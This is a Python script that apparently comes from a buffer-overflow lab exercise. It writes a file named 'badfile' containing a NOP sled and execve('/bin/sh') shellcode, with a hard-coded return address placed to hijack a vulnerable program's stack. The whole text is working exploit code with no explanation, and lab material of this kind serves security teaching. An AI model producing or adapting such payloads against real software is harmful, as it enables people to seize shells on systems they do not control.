shellcode= (
"\x31\xc0" # xorl %eax,%eax
"\x50" # pushl %eax
"\x68""//sh" # pushl $0x68732f2f
"\x68""/bin" # pushl $0x6e69622f
"\x89\xe3" # movl %esp,%ebx
"\x50" # pushl %eax
"\x53" # pushl %ebx
"\x89\xe1" # movl %esp,%ecx
"\x99" # cdq
"\xb0\x0b" # movb $0x0b,%al
"\xcd\x80" # int $0x80
).encode('latin-1')
# Fill the content with NOPs
content = bytearray(0x90 for i in range(933))

# Put the shellcode at the end
start = 400;
end = 400 + len(shellcode)
content[start:end] = shellcode

# Put the address
#ret = 0xbfffec38 + 180
ret = 0xbfffe9e8 - 600
content[834:838] = (ret).to_bytes(4,byteorder='little')

#content = bytearray(0x41 for i in range(20))
#write
with open('badfile','wb') as f:
    f.write(content)

